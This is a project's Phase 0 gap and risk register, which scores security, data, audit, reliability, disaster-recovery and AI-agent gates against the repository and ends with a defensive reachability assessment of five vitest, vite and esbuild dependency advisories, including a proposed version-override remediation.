# Phase 0 — Gap and Risk Register

Deliverable C of `20_CLAUDE_MASTER_IMPLEMENTATION_PROMPT.md`. Maps the current state of the
repository against every gate in
`docs/production-handoff/v1.3.0-security-resilience/19_ACCEPTANCE_GATES_EVIDENCE_MATRIX.md`.

**Baseline:** `1f74bdd` (= `origin/main`), clean tree.

**Scoring rule, taken from v1.4.0 `24_ACCEPTANCE_GATES_EVIDENCE_MATRIX.md` and applied to both
matrices:** _a gate cannot be PASS when evidence exists only in an unmerged branch, mock, or
document._ PR #5 (`0ca3628`) is unmerged, so nothing it delivers is scored as present. Where it is
relevant it is noted as **in flight** so the PR plan does not duplicate it.

**Status vocabulary**

| Status          | Meaning here                                                                          |
| --------------- | ------------------------------------------------------------------------------------- |
| PASS            | The control exists on `main` and the gate's minimum evidence is reproducible today    |
| PARTIAL         | A real, tested component of the control exists; the gate's full evidence set does not |
| FAIL            | A control is present but demonstrably insufficient for its stated purpose             |
| NOT IMPLEMENTED | No control exists                                                                     |

**Risk tiers** are the package's own (`02_SECURITY_GOVERNANCE_AND_RISK_OWNERSHIP.md` §3):
R0 routine · R1 controlled · R2 significant · R3 critical · R4 existential. The tier records the
_maximum plausible impact of the gap if the system were carrying production traffic_, which is the
only reading that makes the register useful for sequencing. It is not a claim that the risk is live
today — nothing is deployed.

**Evidence rule (owner ruling 1).** No requirement may be marked satisfied merely because it appears
in documentation. Acceptance requires repository and test evidence. This restates the scoring rule
above rather than adding a new one, and it applies to the v1.4.0 `NA-01`…`NA-20` gates equally when
they begin to be scored.

**Roadmap context (owner ruling 1).** v1.2's ten-PR sequence is the delivery spine; v1.3.0 is the
mandatory control and acceptance overlay; v1.4.0 is the mandatory architectural and interoperability
overlay. Gates in this register are the v1.3.0 overlay applied to that spine — not a separate
programme. See `README.md` §A.5.

---

## 1. Gate matrix — all 32 gates

### Security

| Gate   | Requirement                | Status              | Tier | Evidence / gap                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ------ | -------------------------- | ------------------- | ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SEC-01 | Trusted identity context   | **PARTIAL**         | R3   | Transaction-scoped context exists, fails closed when absent, and is tested (`rls.test.ts`). But `app.actor_id` and `app.tenant_id` are caller-supplied session variables with no verification, and no authenticated principal model or `users` table exists on `main`. The gate's actual requirement — "client-supplied actor/tenant identifiers cannot create authority" — is not established. _In flight: PR #5 adds a verified-actor admin boundary._ |
| SEC-02 | Authority table protection | **NOT IMPLEMENTED** | R3   | No authority-bearing table exists on `main`, so nothing is protected and nothing is exposed. Constraint 7 holds vacuously. _In flight: PR #5 revokes all runtime writes on five authority tables and routes them through audited `SECURITY DEFINER` operations._                                                                                                                                                                                         |
| SEC-03 | Cross-tenant isolation     | **PARTIAL**         | R3   | Database layer only: RLS `ENABLE` + `FORCE` on all four tables, cross-tenant denial proven by `rls.test.ts` and `ledger.test.ts`. The gate requires DB **and** API, storage, cache, search, export, and vector paths. Six of seven layers do not exist to test.                                                                                                                                                                                          |
| SEC-04 | Privileged access          | **NOT IMPLEMENTED** | R3   | No MFA, no JIT elevation, no break-glass identity, no alerting, no access review. `freightos_control_plane` is a standing RLS-bypass login with no step-up and no review cadence. _In flight: PR #5 adds a `NOLOGIN` definer-owner model and a named `freightos_admin` operator connection._                                                                                                                                                             |
| SEC-05 | Secret protection          | **PARTIAL**         | R2   | `gitleaks` 8.24.3 scans **full history** in CI with `--exit-code=1`; `.env` gitignored; env validation fails closed; no production secret exists to leak. Missing: managed secret store, rotation procedure, tested rotation, secret-access logging, image/artifact scanning (no image is built).                                                                                                                                                        |

### Data and privacy

| Gate    | Requirement              | Status              | Tier | Evidence / gap                                                                                                                                                                                                                                                                                                                        |
| ------- | ------------------------ | ------------------- | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| DATA-01 | Classification inventory | **PARTIAL**         | R2   | `docs/governance/DATA_CLASSIFICATION.md` defines classes and inventories the fields that exist. It does not carry the per-field owner, purpose, retention class, and sharing rule that `policies/data-classification.yaml` requires, and does not use the package's D0–D5 vocabulary. Retention periods are explicitly unset (OQ-12). |
| DATA-02 | Logging redaction        | **NOT IMPLEMENTED** | R3   | No logger, no telemetry emission, no redaction library, and therefore no test. `OTEL_EXPORTER_OTLP_ENDPOINT` is declared and unused.                                                                                                                                                                                                  |
| DATA-03 | Deletion                 | **NOT IMPLEMENTED** | R2   | No deletion engine, no deletion record, no propagation, no reconciliation report. Nothing to delete from.                                                                                                                                                                                                                             |

### Audit

| Gate   | Requirement       | Status      | Tier | Evidence / gap                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ------ | ----------------- | ----------- | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| AUD-01 | Append-only audit | **PARTIAL** | R3   | Strongest control present. `audit_events` is append-only by trigger **and** privilege revocation; proven by `ledger.test.ts` (15 tests). Attribution is complete in _shape_ (actor type, actor id, correlation, causation, policy version). Gaps: attribution is not _verified_ (see SEC-01); no hash chain or sequence linkage; audit shares the operational database, so Article V.3's "operationally isolated" is unmet; no retention policy. |

### Events and integration

| Gate   | Requirement    | Status              | Tier | Evidence / gap                                                                                                                                                                                                                                                                                                              |
| ------ | -------------- | ------------------- | ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| EVT-01 | Idempotency    | **NOT IMPLEMENTED** | R3   | No idempotency-key store, no duplicate-request handling, no stable replayed response. The requirement is recorded in a comment at `0003_audit_and_outbox.up.sql:130` and nowhere implemented.                                                                                                                               |
| EVT-02 | Outbox / inbox | **PARTIAL**         | R3   | The outbox **table** is real, well-shaped (CloudEvents envelope, unique `event_id`, attempt counter, expiring claim lease), RLS-protected, `DELETE`/`TRUNCATE` revoked, and status transitions guarded by `app.outbox_guard()`. There is **no publisher, no consumer, no inbox, and no crash-window test**. Half a control. |
| EVT-03 | Reconciliation | **NOT IMPLEMENTED** | R3   | No reconciliation record, detector, owner assignment, or report. The package ships `schemas/reconciliation-record.schema.json`; nothing consumes it.                                                                                                                                                                        |

### Reliability

| Gate   | Requirement        | Status              | Tier | Evidence / gap                                                                                                                                                                                                                                                                                 |
| ------ | ------------------ | ------------------- | ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| REL-01 | Criticality / SLOs | **NOT IMPLEMENTED** | R2   | No service is classified A–D. No SLI, SLO, RTO, RPO, dashboard, alert, or on-call runbook exists. `policies/slo-defaults.yaml` is unused.                                                                                                                                                      |
| REL-02 | Degraded operation | **NOT IMPLEMENTED** | R3   | No workflow exists to degrade. No fail-open/fail-closed declaration per workflow, no last-known-good cache, no circuit breaker, no bulkhead. The model gateway's disabled-by-default posture is the only fail-closed dependency behavior, and it is configuration, not a tested degraded mode. |
| REL-03 | Cell isolation     | **NOT IMPLEMENTED** | R2   | No cell abstraction, no placement, no per-cell quota. ADR-0010 records the intent.                                                                                                                                                                                                             |
| REL-04 | Capacity           | **NOT IMPLEMENTED** | R2   | No load test, no declared demand, no headroom measurement.                                                                                                                                                                                                                                     |

### Disaster recovery

| Gate  | Requirement       | Status              | Tier | Evidence / gap                                                                                                                                                                                           |
| ----- | ----------------- | ------------------- | ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| DR-01 | Backup integrity  | **NOT IMPLEMENTED** | R4   | **No backup of any kind exists**, therefore no monitoring, no immutability, no cross-region copy. Tiered R4 because `02_…` §3 places unrecoverable data loss at R4 and this is the gap that produces it. |
| DR-02 | Restore proof     | **NOT IMPLEMENTED** | R4   | No restore has ever been performed. Migration reversibility is proven (`migrations.test.ts`), which is schema recovery, not data recovery, and must not be reported as satisfying this gate.             |
| DR-03 | Regional recovery | **NOT IMPLEMENTED** | R3   | No region is selected. No failover, no reconciliation after failover.                                                                                                                                    |

### Secure delivery

| Gate    | Requirement        | Status              | Tier | Evidence / gap                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ------- | ------------------ | ------------------- | ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SDLC-01 | Protected delivery | **PARTIAL**         | R2   | CI is blocking, runs on every pull request, and nothing is `continue-on-error`. Work lands through reviewed pull requests; direct commits to `main` are prohibited by the constitution. Gaps: branch-protection settings are not evidenced in-repo, no `CODEOWNERS`, no signed commits, and **no artifact is built at all**, so "exact tested artifact promoted" has no subject. **`main` was red at `1f74bdd`** — two merged pull requests left the v1.2 handoff checksum check failing, which is itself evidence that merge protection is not enforcing a green pipeline. Fixed in this PR; see `README.md` §A.4a. |
| SDLC-02 | Supply chain       | **NOT IMPLEMENTED** | R3   | No SBOM, no provenance attestation, no artifact signature, no deployment-time verification. `pnpm install --frozen-lockfile` and a committed lockfile are the only supply-chain controls. **CI runs no dependency scan**: `pnpm audit` reports 1 critical, 1 high, and 3 moderate advisories in the `vitest` toolchain, all surfaced by GitHub Dependabot rather than by this repository's own pipeline. Detail and exploitability assessment: `PHASE_0_INVENTORY.md` §8.1.                                                                                                                                          |
| SDLC-03 | Safe migration     | **PARTIAL**         | R3   | Every migration has a tested down path; apply → revert → re-apply and partial revert are proven against a live cluster (19 integration tests). **No expand-and-contract tooling, no backfill batching, no dual-version compatibility test** — `08_…` §7's actual requirement.                                                                                                                                                                                                                                                                                                                                        |
| SDLC-04 | Canary rollback    | **NOT IMPLEMENTED** | R3   | No deployment, no canary, no rollback automation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |

### Incident response

| Gate  | Requirement        | Status              | Tier | Evidence / gap                                                                                                                                                                                                                                        |
| ----- | ------------------ | ------------------- | ---- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| IR-01 | Incident readiness | **NOT IMPLEMENTED** | R2   | No named roles, no severity matrix in-repo, no contact path, no incident register, no evidence-preservation process. `docs/runbooks/` holds two files, neither an incident runbook. The package ships the matrix and templates; they are not adopted. |
| IR-02 | Exercise           | **NOT IMPLEMENTED** | R2   | No tabletop, no technical exercise.                                                                                                                                                                                                                   |

### AI and agents

| Gate  | Requirement          | Status              | Tier | Evidence / gap                                                                                                                                                                                                                                                                                                                                                                             |
| ----- | -------------------- | ------------------- | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| AI-01 | Agent registry       | **PARTIAL**         | R2   | 32 agents registered and schema-validated, with declared ceilings clamped in CI (25 of 32 clamped below their declared value) and a 12-verb physical-control denylist. Missing per gate: per-agent accountable owner (placeholder only), tool list (**empty for all 32**, which the registry itself defines as "no tool may be called"), limits, approval path, and per-agent kill switch. |
| AI-02 | Deterministic policy | **NOT IMPLEMENTED** | R3   | No policy engine, no action envelope, no authorization step. Also no agent runtime, so nothing is currently unauthorized either.                                                                                                                                                                                                                                                           |
| AI-03 | Injection resistance | **NOT IMPLEMENTED** | R3   | No prompt-injection, secret-exfiltration, cross-tenant-retrieval, or tool-abuse suite.                                                                                                                                                                                                                                                                                                     |
| AI-04 | Bounded remediation  | **NOT IMPLEMENTED** | R3   | No runbook automation, no rate limit, no rollback, no kill switch for remediation.                                                                                                                                                                                                                                                                                                         |
| AI-05 | No self-deployment   | **PARTIAL**         | R2   | Structurally satisfied today: there is no deployment path at all, and CI cannot merge or deploy. But it is satisfied by absence, not by an enforced control, and no test asserts it. Branch protection and required-review settings are not evidenced in the repository.                                                                                                                   |

### Vendors

| Gate   | Requirement            | Status              | Tier | Evidence / gap                                                                                                                                                          |
| ------ | ---------------------- | ------------------- | ---- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| VEN-01 | Critical vendor review | **NOT IMPLEMENTED** | R2   | No vendor is tiered V0–V3. `INTEGRATION_REGISTRY.md` lists intended integrations and their gating but performs no security, continuity, incident, data, or exit review. |
| VEN-02 | Connector containment  | **NOT IMPLEMENTED** | R3   | No connector exists. No per-connector credential, worker isolation, circuit breaker, kill switch, or reconciliation.                                                    |

### Roll-up

| Status          | Count |
| --------------- | ----- |
| PASS            | **0** |
| PARTIAL         | 11    |
| FAIL            | 0     |
| NOT IMPLEMENTED | 21    |

**No gate passes.** That is the correct and expected result for a repository with no deployable
unit, and it is stated plainly rather than softened.

---

## 2. Blockers, in the order required by the prompt

`20_CLAUDE_MASTER_IMPLEMENTATION_PROMPT.md` §C fixes the ordering. Each blocker below names what
must be true before the next layer is worth building.

### 1. Cross-tenant or fabricated-authority risk — **R3**

`app.actor_id` and `app.tenant_id` are caller-supplied and unverified; there is no principal,
membership, role, or permission model on `main`; there is no service tier to assign context from a
verified session. Every downstream control — audit attribution, policy decisions, agent authority,
approvals — inherits its trustworthiness from this. Nothing else should be built first.

_Mitigating context:_ the RLS substrate underneath is correct, forced, and tested, and PR #5 already
implements the identity model and a verified-actor mutation boundary. The blocker is real; the work
is largely done and unmerged.

### 2. Privileged and runtime database ownership risk — **R3**

`freightos_migrator` owns every object and holds `CREATEROLE`. It is correctly **not** a superuser
and **not** `BYPASSRLS`, and `FORCE ROW LEVEL SECURITY` binds it — that is the right shape. What is
missing is the separation the package requires: no `NOLOGIN` definer owners on `main`, no
distinction between deployment authority and runtime authority beyond `freightos_app`, and
`freightos_control_plane` is a standing unaudited RLS bypass with no step-up, expiry, or review.

### 3. Secrets and sensitive logging — **R2 now, R3 once anything runs**

Today: no production secret exists, and full-history secret scanning is enforced. The gap is
forward-looking and structural — there is **no logger and no redaction library**, so the first line
of logging code written will be written without a guardrail. `05_…` and `DATA-02` require D4/D5
values to be provably excluded. Building the redaction boundary _before_ the first service is
strictly cheaper than retrofitting it.

### 4. Unrecoverable data and untested backups — **R4**

No backup exists. No restore has ever been performed. This is the highest-tier gap in the register
and the only R4. It is not urgent _today_ because there is no production data, and it becomes
urgent the moment there is — which is why it must be sequenced before, not after, the first
environment carries real records.

**Owner ruling 6 — accepted as the only current R4, and it must remain prominently tracked.**
Closure is **SR-12** (`PHASE_0_PR_PLAN.md` §D-8d), sequenced immediately after SR-2, or earlier if it
can be completed without conflicting with PR #5 or SR-2. It is no longer blocked on a cloud decision:
the smallest reviewable form proves the procedure against a local synthetic database.

**Documentation alone will not close this.** Closure requires nine evidence items — a backup taken
from a safe synthetic or approved nonproduction database; encrypted storage and access controls;
restoration into an isolated environment; post-restore integrity checks; **post-restore
tenant-boundary verification**; measured recovery time and observed data-loss window; documented
failure handling; repeatable commands or automation; and no production customer data in chat,
commits, or fixtures. **Backup capability may not be represented as accepted until an actual restore
has succeeded and the evidence is preserved.** DR-01 and DR-02 stay NOT IMPLEMENTED until then.

### 5. Unsafe live external side effects and duplicate effects — **R3**

No live side effect exists, which is the correct state and is enforced by scope validation, unsigned
legal gates, and `MODEL_GATEWAY_ENABLED=false`. The gap is that **no idempotency store, no consumer
inbox, no reconciliation, and no connector containment exist**, so the first integration would be
built onto nothing. `EVT-01`, `EVT-02`, and `EVT-03` must precede the first connector.

### 6. Unaudited consequential actions — **R3**

Audit is append-only and well-shaped, and that is genuinely good. Two gaps: the recorded actor is
unverified (blocker 1), and audit is not operationally isolated from application writes — same
database, same failure domain, same backup that does not exist. Article V.3 requires isolation.

### 7. Unbounded agent authority — **R2 today**

Bounded by absence: no runtime, no tools, all 32 `allowed_tools` empty, ceilings clamped in CI, and
a physical-control denylist. The risk is that the bound is a _convention plus a validator_ rather
than a runtime gate, and the runtime gate (`AI-02`) does not exist. Sequencing constraint from
`18_…`: agent execution must not be implemented before identity, policy, audit, and idempotency.

### 8. Missing rollback and degraded behavior — **R3**

Schema rollback is proven. Application rollback, canary, feature-flag kill, degraded mode,
last-known-good configuration, and circuit breaking do not exist. `REL-02` requires AI plus two
critical external dependencies to be able to fail without unsafe core outage; there is no core to
keep up.

### 9. Remaining reliability and compliance evidence gaps — **R2**

No SLO, no error budget, no capacity test, no observability, no incident process, no vendor tiering,
no control catalog, no named risk owners. These are the largest volume of work and the least
dangerous to defer, provided they are not deferred past the point where a real environment exists.

---

## 2a. Tracked risks opened by this Phase 0

Risks opened here are prefixed `PR0-R-` so they do not collide with the `R-01`…`R-15` series in
`docs/governance/RISK_REGISTER.md`.

| ID       | Risk                                                                                                                                                                                                                                      | Tier                                               | Status                                     | Owner       | Closure                                                                                                                                                                                                         |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- | ------------------------------------------ | ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PR0-R-16 | **Five open dependency advisories, and CI performs no dependency scan.** 1 critical, 1 high, 3 moderate, all in the `vitest` test toolchain. Surfaced by GitHub Dependabot on push; the repository's own pipeline does not look for them. | R2 — see Appendix A for the per-advisory reasoning | **Open**                                   | Engineering | **SR-10** (isolated remediation, no forced or broad upgrade) then **SR-11** (blocking dependency scan in CI). Neither may be mixed into SR-2.                                                                   |
| PR0-R-17 | **Versioned handoff packages can be edited without their digest being regenerated.** The defect that made `main` red at `1f74bdd`. Owner ruling 2 fixes the forward rule; nothing enforces it yet.                                        | R1                                                 | **Open — rule fixed, enforcement pending** | Engineering | **SR-9** (registry outside checksummed packages) and **SR-8** (validator that fails when a checksummed historical package is modified at all, plus verification of the two unverified `MANIFEST.sha256` files). |

Appendix A holds the full per-advisory assessment for PR0-R-16.

---

## 3. Alignment with the existing risk register

`docs/governance/RISK_REGISTER.md` holds 15 build-scope risks (R-01…R-15) framed for Horizon 1
delivery, not for production security. The two registers do not conflict and should not be merged:

- R-03 (cross-tenant exposure) and R-04 (audit tampering) are marked _Mitigated_ there **for the
  code that exists**. That remains accurate at the database layer and is consistent with SEC-03 and
  AUD-01 being PARTIAL here — the difference is that the v1.3.0 gates require six more layers and
  verified attribution.
- R-14 (credentials in source) _Mitigated_ is consistent with SEC-05 PARTIAL.
- Nothing in `RISK_REGISTER.md` covers backups, restore, SLOs, incident response, supply chain, or
  vendor risk. Those enter the project through this document.

**Proposed change (needs owner agreement, not made here):** add an R0–R4 tier column to
`RISK_REGISTER.md` and cross-reference it to this register, rather than maintaining two vocabularies.

---

## 4. Decisions from `22_DECISIONS_REQUIRED.md` that are already answerable

Recorded so the owner sees which are genuinely open and which the repository has effectively
settled.

| Decision                    | Required before | Repository position                                                                                                                                                                                                                                     |
| --------------------------- | --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Identity provider strategy  | Phase 1         | **Open.** No provider chosen. The package recommends managed identity; the repository builds authorization internally and has no authentication at all.                                                                                                 |
| Policy engine               | Phase 1         | **Open.** No engine. `config/policy/base_policy.yaml` holds vocabularies without rules.                                                                                                                                                                 |
| Highly sensitive encryption | Phase 2         | Open. No KMS, no field encryption.                                                                                                                                                                                                                      |
| Audit retention             | Phase 2         | Open. Audit exists; retention is unset (OQ-12).                                                                                                                                                                                                         |
| Event platform              | Phase 3         | Open. Outbox table only; no broker selected.                                                                                                                                                                                                            |
| Exactly-once policy         | Phase 3         | **Effectively settled by design** — the outbox carries a unique `event_id` and a claim lease, consistent with at-least-once delivery plus idempotent consumers. Needs recording as an ADR.                                                              |
| Production SLOs             | Phase 4         | Open. `policies/slo-defaults.yaml` unused.                                                                                                                                                                                                              |
| Primary cloud and region    | Phase 5         | **Deliberately open** — Phase 0 was forbidden from selecting a provider.                                                                                                                                                                                |
| Backup isolation            | Phase 5         | Open for _provider-specific_ isolation (cross-account, cross-region, object-lock). **Not blocking the R4 closure** — owner ruling 6 sequences SR-12 to prove backup and restore against a local synthetic database first, deferring provider selection. |
| AI provider data policy     | Phase 6         | **Partially settled** — `MODEL_GATEWAY_ENABLED=false`, provider-independent gateway (ADR-0009/0016), no provider selected, so no training-rights exposure exists yet.                                                                                   |
| Agent execution ceiling     | Phase 6         | **Settled and enforced** — every carrier agent resolves to A3 or lower in Horizon 1; `AUTONOMOUS_DISPATCH_A4_ENABLED` is mandatory-`false`; 25 of 32 agents clamped in CI.                                                                              |
| Autonomous remediation      | Phase 6         | Open. Nothing implemented; Level 1 is the package's recommended start.                                                                                                                                                                                  |
| Cell placement unit         | Phase 7         | Open. ADR-0010 records intent only.                                                                                                                                                                                                                     |
| External assurance          | Phase 8         | Open.                                                                                                                                                                                                                                                   |

---

# Appendix A — Dependency advisory assessment (PR0-R-16)

Produced in response to the owner instruction: _do not use a forced or broad dependency upgrade;
produce a separate advisory assessment; add an automated dependency scan to CI through a dedicated
reviewable change; do not mix dependency upgrades into SR-2._

**Scope.** The five advisories `pnpm audit` reports at `1f74bdd` (exit 1 — `5 vulnerabilities found /
3 moderate | 1 high | 1 critical`). All five enter through the single root devDependency `vitest`
(`package.json:42`, `"vitest": "^2.1.8"` → `vitest@2.1.9`).

**Method.** Static reachability against the _installed_ bytes in `node_modules/.pnpm`; each
assessment then re-attacked by an independent verifier instructed to refute it; plus one coordinated
upgrade executed in an isolated throwaway worktree with real exit statuses against a live
PostgreSQL 16. **Four of the five first-pass assessments were refuted or materially corrected**; the
corrected position is what is recorded here. The repository was not modified by the assessment.

**Limits.** This is a per-advisory reachability and remediation assessment. It makes no statement
about the repository's overall security posture, and **no gate — SDLC-02 or otherwise — is claimed
to be satisfied by it.** `pnpm audit` is a lower bound: it reports only what the advisory database
knows, which is itself part of the argument for SR-11.

## A.1 Summary

| Advisory            | Sev      | Package (installed)                      | Dependency path                           | Vulnerable code reachable?                                                                                                                                                  | Exposure                                              | Fixed versions                                                          | Disposition                                           |
| ------------------- | -------- | ---------------------------------------- | ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------- | ----------------------------------------------------- |
| GHSA-5xrq-8626-4rwp | critical | `vitest` 2.1.9                           | `.` → `vitest` (**direct devDependency**) | **No** — the file read/write RPC registers only under `options.api && options.watch`; every entry point is `vitest run`                                                     | dev + CI toolchain; not shipped                       | none on 2.x (the line ends at the installed 2.1.9); **≥ 3.2.6**         | remediate in SR-10                                    |
| GHSA-fx2h-pf6j-xcff | high     | `vite` 5.4.21                            | `.` → `vitest` → `vite`                   | **No**, for two independent reasons: no socket is ever bound, and the one guard site vitest drives is short-circuited by `options.ssr \|\|`                                 | dev + CI toolchain; not shipped                       | none on 5.x (ends at 5.4.21); **≥ 6.4.3**                               | remediate in SR-10                                    |
| GHSA-4w7w-66w2-5vf9 | moderate | `vite` 5.4.21                            | `.` → `vitest` → `vite`                   | **No** — the `.map` branch is entered only from an inbound HTTP request; `httpServer` is `null` in middleware mode                                                          | dev + CI toolchain; not shipped                       | **≥ 6.4.2**; practical floor ≥ 6.4.3                                    | remediate in SR-10                                    |
| GHSA-v6wh-96g9-6wx3 | moderate | `vite` 5.4.21 (vendored `launch-editor`) | `.` → `vitest` → `vite`                   | **Reachable only under a configuration this repository does not use, and only on Windows.** The route is one standard command away — `pnpm exec vite` — not an obscure flag | dev workstation only (Windows); CI is `ubuntu-latest` | **≥ 6.4.3**                                                             | remediate in SR-10                                    |
| GHSA-67mh-4wv8-2f99 | moderate | `esbuild` 0.21.5                         | `.` → `vitest` → `vite` → `esbuild`       | **No** — the vulnerable server is esbuild's own `serve()`, which vite never calls                                                                                           | dev + CI toolchain; not shipped                       | **≥ 0.25.0**; unreachable while on vite 5, which pins `esbuild ^0.21.3` | remediate in SR-10, as a consequence of the vite move |

`pnpm why vite --depth 5` → "Found 1 version of vite". `pnpm why esbuild --depth 5` → "Found 1
version of esbuild". No workspace package declares `vite`, `vitest`, or `esbuild`, or any
devDependency at all.

**Nothing ships.** No workspace package defines a `build` script, so root `"build": "turbo run build"`
is a no-op; all packages are `private` and export raw TypeScript; there is no `dist/` outside
`node_modules` and no Dockerfile. `ships_in_any_artifact = false` for all five — and that fact is
load-bearing for every acceptance below.

**Exposure wording, corrected.** "Development-only" is imprecise. The accurate classification is
**development-and-CI**: `.github/workflows/ci.yml:8` is an unqualified `on: pull_request`, so fork
pull requests are checked out and the toolchain runs against attacker-authored test files. That is
not a path to any of these five — each needs a listening server, and two additionally need Windows —
but it is where the code executes, and the record should say so plainly rather than lean on
"it's only a devDependency".

## A.2 Two commonly asserted mitigations that are false

Recorded because either one, believed, would justify closing this risk without fixing it.

1. **"`@vitest/ui` is not installed, so the server cannot start."** Vitest auto-installs it —
   `ensureInstalled("@vitest/ui", …)` prompts on any TTY and runs `installPackage(…, { dev: true })`.
2. **"Both the UI package and a flag are required."** Bare `--api` suffices;
   `resolveApiServerConfig` turns it into `{ port: 51204 }`.

The genuine reason GHSA-5xrq-8626-4rwp is not reachable is narrower and worth stating exactly:
2.1.9 already token-gates `/__vitest_api__` with a `timingSafeEqual` comparison against a per-run
UUID. What 3.2.6 adds is `allowWrite`/`allowExec` defaulting to false when `api.host` is
non-loopback. **The residual risk in 2.1.9 is specifically an API or UI server bound to a
non-loopback interface** — a container, devcontainer, or Codespace — where 2.1.9 has no such guard.

## A.3 Compatibility — and a defect the upgrade surfaced

`vitest.workspace.ts:25` sets `fileParallelism: false` on the integration project. Under vitest 3
that is a type error (`'fileParallelism' does not exist in type 'ProjectConfig'`), because the pool
reads the option from the **root** config only. An A/B probe showed the option is **already a
silent no-op under vitest 2.1.9** — integration test files overlap today.

**Correcting the consequence, which the first-pass analysis got wrong:** this does _not_ mean the
integration files race on a shared database. `packages/database/test/integration/harness.ts:12-14`
states that **each test file owns its own database**, precisely because "sharing one and resetting
per file made files interfere whenever the runner overlapped them". Isolation is achieved by the
harness, not by the config flag. So the defect is that **the configuration claims a guarantee it does
not provide, and its comment gives a stale rationale** — a maintenance and comprehension hazard, not
an active correctness bug. Tracked as **PR0-R-18** below.

It must get its own change. **SR-10 must not "fix" it by deleting the key**, which would erase the
record and silently change what the configuration asserts.

### Coordinated upgrade — measured, in an isolated worktree

| Command                                                              | Exit  | Result                                                               |
| -------------------------------------------------------------------- | ----- | -------------------------------------------------------------------- |
| `pnpm install --frozen-lockfile`                                     | 0     | `Packages: +181`                                                     |
| `pnpm install --strict-peer-dependencies`                            | 0     | **zero** peer-dependency warnings                                    |
| `pnpm typecheck` (and `--force`)                                     | 0     | 4 successful                                                         |
| `pnpm test`                                                          | 0     | **56 passed — identical to baseline**                                |
| `pnpm test:integration`                                              | 0     | **49 passed** against live PostgreSQL 16                             |
| `pnpm test:all`                                                      | 0     | 105 passed                                                           |
| `pnpm lint`, `format:check`, `validate:scope`, `validate:provenance` | 0     | `SCOPE_VALIDATION=PASS`, `PROVENANCE=PASS`                           |
| `pnpm audit`                                                         | **0** | `No known vulnerabilities found` (baseline: exit 1, five advisories) |

- `vitest.workspace.ts` needs **no edit**; `defineWorkspace` still works, but every run now prints a
  non-fatal `DEPRECATED` banner. It becomes **fatal at vitest 4**, which removes `defineWorkspace`
  entirely and which this repository has no root `vitest.config.ts` to migrate into. **Do not
  "upgrade vitest" unqualified — `latest` is already 4.1.10.**
- No test file needs editing: no test uses `vi.*`, `spyOn`, `mock`, or snapshots, so none of the
  vitest 3 breaking changes applies — verified on `main` **and** on the PR #5 branch.
- Node floors are satisfied by the declared `engines.node: ">=22.0.0"` and CI's `node-version: 22`.

## A.4 Proposed isolated remediation — SR-10

**The finding that determines the shape of the PR: bumping `vitest` alone does not clear four of the
five advisories.** vitest 3.2.6 declares `vite: "^5.0.0 || ^6.0.0 || ^7.0.0-0"`, so pnpm legally
keeps the existing `vite@5.4.21` pin — `pnpm audit` then still exits 1 with 4 vulnerabilities. An
explicit override is required to make the resolution deterministic and reviewable.

Two root files change, and nothing else:

```diff
# package.json
-    "vitest": "^2.1.8"
+    "vitest": "3.2.6"
+  },
+  "pnpm": {
+    "overrides": {
+      "vite": "^6.4.3"
+    }
```

plus the regenerated `pnpm-lock.yaml`. Resulting tree: `vitest@3.2.6`, `vite@6.4.3`,
`esbuild@0.25.12`. `esbuild` needs no override — vite 6.4.3 pins `esbuild ^0.25.0`. `vitest` is
pinned **exactly**, because `@vitest/coverage-v8` peer-pins vitest to an exact version.

**Caveat on the tested change, and an open owner decision.** `^6.4.3` resolves to 6.4.3 forever on a
**terminal, EOL major** — structurally the same position that produced these findings on vite 5.
`^7.3.6` is equally admitted by vitest 3.2.6 and is what a from-scratch resolution picks, but it was
**not exercised** by the battery above and would require `engines.node ≥ 22.12.0`. If the owner
prefers vite 7, **the entire battery must be re-run against it before merge** — do not swap the range
on the strength of this document.

**Merge-order coupling with PR #5.** That branch adds `"@vitest/coverage-v8": "^2.1.9"` and a
`test:coverage` script wired into `verify`. `@vitest/coverage-v8` peer-pins vitest _exactly_, so
`^2.1.9` cannot satisfy vitest 3.2.6. If PR #5 lands first, SR-10 becomes a **two**-line manifest
change with both packages pinned to the same exact version. Merging the existing
`origin/dependabot/npm_and_yarn/vitest-3.2.6` branch as-is, in either order, leaves an unmet exact
peer — and it also predates PR #5's widening of the unit `include` glob.

**What SR-10 must not change:** no source or test file (counts must stay 56 / 49 / 105 or every
difference must be explained); not `vitest.workspace.ts`; not `ci.yml`; no coverage threshold
relaxed; no runtime dependency; and **not combined with SR-2 or SR-11**.

**Tests required before merge:** `pnpm audit` before and after with the exact advisory list ·
`pnpm install --frozen-lockfile` · `pnpm install --strict-peer-dependencies` with zero warnings ·
`pnpm typecheck` and `--force` · `pnpm test` · `pnpm test:integration` · `pnpm test:all` · `pnpm lint`
